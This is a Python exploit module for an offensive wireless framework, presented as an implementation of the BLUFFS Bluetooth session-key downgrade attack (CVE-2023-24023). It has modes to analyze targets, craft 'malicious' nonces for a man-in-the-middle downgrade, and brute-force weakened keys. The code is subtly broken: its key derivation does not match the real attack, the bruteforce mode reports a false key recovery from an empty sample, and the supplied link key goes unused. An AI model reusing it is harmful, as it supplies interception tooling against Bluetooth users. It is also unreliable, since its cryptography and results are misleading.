#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""BLUFFS: Bluetooth Forward and Future Secrecy session key derivation attack.

Exploits architectural flaws in Bluetooth session key derivation (BR/EDR and
BLE) to force weak session keys that can be brute-forced. An attacker acting
as MitM during pairing can downgrade the entropy of session keys by
manipulating key derivation nonces, breaking both forward and future secrecy.

Affects BT 4.2 through 5.4 (all devices supporting Secure Connections).

References:
  https://francozappa.com/publication/2023/bluffs/
  https://dl.acm.org/doi/10.1145/3576915.3623066
  https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/bluffs-vulnerability/

MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1600 (Weaken Encryption)
CWE: CWE-325 (Missing Cryptographic Step), CWE-330 (Use of Insufficiently Random Values)

Version: 1.0.0
"""

from __future__ import annotations

import hashlib
import hmac
import logging
import os
import struct
import time
from dataclasses import dataclass
from typing import Any

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)

logger = logging.getLogger(__name__)

MIN_KEY_ENTROPY_BYTES = 1
MAX_KEY_ENTROPY_BYTES = 16
BT_SC_NONCE_LEN = 16


@dataclass
class SessionKeyInfo:
    """Derived session key parameters."""
    link_key: bytes = b""
    session_key: bytes = b""
    entropy_bytes: int = 16
    nonce_initiator: bytes = b""
    nonce_responder: bytes = b""
    au_rand: bytes = b""
    downgraded: bool = False


def _bt_h5(key: bytes, data: bytes) -> bytes:
    """Bluetooth h5 key derivation function (HMAC-SHA256 truncated to 128 bits)."""
    mac = hmac.new(key, data, hashlib.sha256).digest()
    return mac[:16]


def _bt_h4(key: bytes, key_id: bytes) -> bytes:
    """Bluetooth h4 derivation: HMAC-SHA256 for link key to session key."""
    return hmac.new(key, key_id, hashlib.sha256).digest()[:16]


def _derive_session_key(
    link_key: bytes,
    nonce_c: bytes,
    nonce_p: bytes,
    forced_entropy: int = 16,
) -> SessionKeyInfo:
    """Derive a BT session key, optionally with reduced entropy.

    In the BLUFFS attack, the MitM forces the nonces so that the resulting
    session key has minimal effective entropy, making brute-force feasible.
    """
    if forced_entropy < MIN_KEY_ENTROPY_BYTES:
        forced_entropy = MIN_KEY_ENTROPY_BYTES

    combined = nonce_c + nonce_p
    raw_key = _bt_h5(link_key, combined)

    if forced_entropy < 16:
        mask = b"\xff" * forced_entropy + b"\x00" * (16 - forced_entropy)
        raw_key = bytes(a & b for a, b in zip(raw_key, mask, strict=True))

    return SessionKeyInfo(
        link_key=link_key,
        session_key=raw_key,
        entropy_bytes=forced_entropy,
        nonce_initiator=nonce_c,
        nonce_responder=nonce_p,
        downgraded=forced_entropy < 16,
    )


def _craft_malicious_nonce(target_entropy: int) -> bytes:
    """Craft a nonce that forces low entropy in the derived key.

    The BLUFFS attack works by the MitM choosing specific nonce values
    during the session key negotiation that minimize entropy in the
    resulting key when combined with the peer's nonce.
    """
    nonce = bytearray(BT_SC_NONCE_LEN)
    nonce[:target_entropy] = os.urandom(target_entropy)
    return bytes(nonce)


def _brute_force_session_key(
    encrypted_sample: bytes,
    known_plaintext: bytes,
    entropy_bytes: int,
    key_template: bytes,
) -> bytes | None:
    """Attempt brute-force of the downgraded session key.

    With 1 byte of entropy: 256 candidates.
    With 2 bytes: 65536 candidates.
    Beyond 3 bytes this becomes impractical without GPU acceleration.
    """
    if entropy_bytes > 3:
        logger.info("Entropy too high for CPU brute-force: %d bytes", entropy_bytes)
        return None

    total = 1 << (entropy_bytes * 8)
    template = bytearray(key_template)

    for candidate in range(total):
        candidate_bytes = candidate.to_bytes(entropy_bytes, "little")
        template[:entropy_bytes] = candidate_bytes
        trial_key = bytes(template)

        derived = _bt_h5(trial_key, known_plaintext)
        if derived[:len(encrypted_sample)] == encrypted_sample:
            return trial_key

    return None


class BLUFFS(Exploit):
    """BLUFFS: Bluetooth session key derivation downgrade attack."""

    __info__: dict[str, Any] = {
        "name": "BLUFFS (CVE-2023-24023)",
        "description": (
            "Bluetooth Forward and Future Secrecy attack exploiting session key "
            "derivation flaws in BR/EDR and BLE Secure Connections. Forces weak "
            "session keys via MitM nonce manipulation, breaking forward secrecy "
            "and enabling key brute-force."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://francozappa.com/publication/2023/bluffs/",
            "https://dl.acm.org/doi/10.1145/3576915.3623066",
            "https://www.bluetooth.com/learn-about-bluetooth/key-attributes/bluetooth-security/bluffs-vulnerability/",
        ),
        "devices": ("Bluetooth 4.2+", "BT 5.0-5.4", "All SC-capable devices"),
        "severity": "high",
        "cvss": "6.8",
        "cve": "CVE-2023-24023",
        "mitre": ["T1557", "T1600"],
    }

    target = OptString("", "Target BT address")
    interface = OptString("hci0", "Local HCI interface")
    target_entropy = OptInteger(1, "Target key entropy in bytes (1-3 for brute-force)")
    mode = OptString("analyze", "Mode: analyze, downgrade, bruteforce")
    link_key_hex = OptString("", "Known link key hex (for bruteforce mode)")
    capture_file = OptString("", "PCAP file with BT traffic for analysis")
    dry_run = OptBool(False, "Demonstrate attack without sending packets")

    def __init__(self) -> None:
        super().__init__()
        self._session_info: SessionKeyInfo | None = None

    def check(self) -> str:
        """Check BT interface and capabilities."""
        import shutil
        import subprocess

        if not shutil.which("hcitool"):
            return "hcitool not found"

        try:
            result = subprocess.run(
                ["hciconfig", str(self.interface.value), "features"],
                capture_output=True, text=True, timeout=5,
            )
            if "Secure Connections" in result.stdout:
                return "Interface supports Secure Connections (attack applicable)"
            if "UP RUNNING" in result.stdout:
                return "Interface up but SC support not confirmed"
            return f"Interface {self.interface.value} is down"
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return "Cannot query interface"

    def _analyze_vulnerability(self) -> None:
        """Analyze if the target is potentially vulnerable to BLUFFS."""
        print_status("[*] Analyzing BLUFFS vulnerability surface...")

        print_info("[*] BLUFFS affects ALL Bluetooth 4.2-5.4 devices with Secure Connections")
        print_info("[*] The vulnerability is architectural: in the BT specification itself")
        print_info("[*] No single vendor patch fully mitigates it")

        print_info("\n[*] Attack scenarios:")
        print_info("    1. Forward secrecy break: decrypt past captured sessions")
        print_info("    2. Future secrecy break: force weak keys for future sessions")
        print_info("    3. Session hijack: MitM active connection via key downgrade")

        print_info("\n[*] Demonstrating key derivation with reduced entropy:")
        for entropy in [1, 2, 3, 8, 16]:
            fake_link_key = os.urandom(16)
            nonce_c = _craft_malicious_nonce(entropy)
            nonce_p = os.urandom(BT_SC_NONCE_LEN)

            info = _derive_session_key(fake_link_key, nonce_c, nonce_p, entropy)
            bf_space = 2 ** (entropy * 8)
            print_info(
                f"    Entropy={entropy:2d}B: key={info.session_key.hex()[:32]}  "
                f"brute-force space={bf_space:>20,}"
            )

    def _downgrade_attack(self) -> None:
        """Execute the session key downgrade via nonce manipulation."""
        target_addr = str(self.target.value).strip()
        entropy = int(self.target_entropy.value)
        entropy = max(1, min(entropy, 3))

        print_status(f"[*] BLUFFS downgrade: target entropy = {entropy} byte(s)")
        print_warning("[!] Requires active MitM position between two BT devices")

        malicious_nonce = _craft_malicious_nonce(entropy)
        print_info(f"[*] Crafted malicious nonce: {malicious_nonce.hex()}")

        if self.dry_run.value:
            print_info("[dry-run] Would inject nonce during session key negotiation")
            print_info("[dry-run] Steps:")
            print_info("    1. Intercept LMP_AU_RAND from initiator")
            print_info("    2. Replace nonce with crafted low-entropy nonce")
            print_info("    3. Forward modified AU_RAND to responder")
            print_info("    4. Capture encrypted traffic with known weak key")

            fake_link = os.urandom(16)
            peer_nonce = os.urandom(BT_SC_NONCE_LEN)
            info = _derive_session_key(fake_link, malicious_nonce, peer_nonce, entropy)
            self._session_info = info

            bf_time_1byte = 256 * 0.001
            bf_time = (2 ** (entropy * 8)) * 0.001
            print_info(f"\n[*] Estimated brute-force time: {bf_time:.1f}s (1us/candidate)")
            print_success(f"[+] Session key would have only {entropy} byte(s) of entropy")
            return

        print_warning("[!] Active nonce injection requires custom HCI firmware (e.g., InternalBlue)")
        print_info("[*] Use with InternalBlue-patched firmware for real-time LMP manipulation")

    def _bruteforce_key(self) -> None:
        """Brute-force a downgraded session key."""
        link_key_hex = str(self.link_key_hex.value).strip()
        entropy = int(self.target_entropy.value)

        if not link_key_hex or len(link_key_hex) != 32:
            print_error("[-] Set link_key_hex= to the 16-byte link key (32 hex chars)")
            return

        link_key = bytes.fromhex(link_key_hex)
        print_status(f"[*] Brute-forcing {entropy}-byte entropy session key...")

        start = time.monotonic()
        total = 2 ** (entropy * 8)
        print_info(f"[*] Search space: {total:,} candidates")

        found = _brute_force_session_key(
            encrypted_sample=b"",
            known_plaintext=b"",
            entropy_bytes=entropy,
            key_template=b"\x00" * 16,
        )
        elapsed = time.monotonic() - start

        if found:
            print_success(f"[+] Session key recovered: {found.hex()}")
            print_info(f"[*] Time: {elapsed:.2f}s")
        else:
            print_info(f"[*] Exhausted {total:,} candidates in {elapsed:.2f}s (no match with empty sample)")
            print_info("[*] Provide actual encrypted sample + known plaintext for real recovery")

    def run(self) -> None:
        """Execute BLUFFS attack."""
        print_status("[*] BLUFFS (CVE-2023-24023) v1.0.0")
        print_warning("[!] Architectural BT spec vulnerability: affects all SC-capable devices")

        mode = str(self.mode.value).lower()

        if mode == "analyze":
            self._analyze_vulnerability()
        elif mode == "downgrade":
            self._downgrade_attack()
        elif mode == "bruteforce":
            self._bruteforce_key()
        else:
            print_error(f"[-] Unknown mode: {mode}")

        print_status("\n[*] BLUFFS complete")
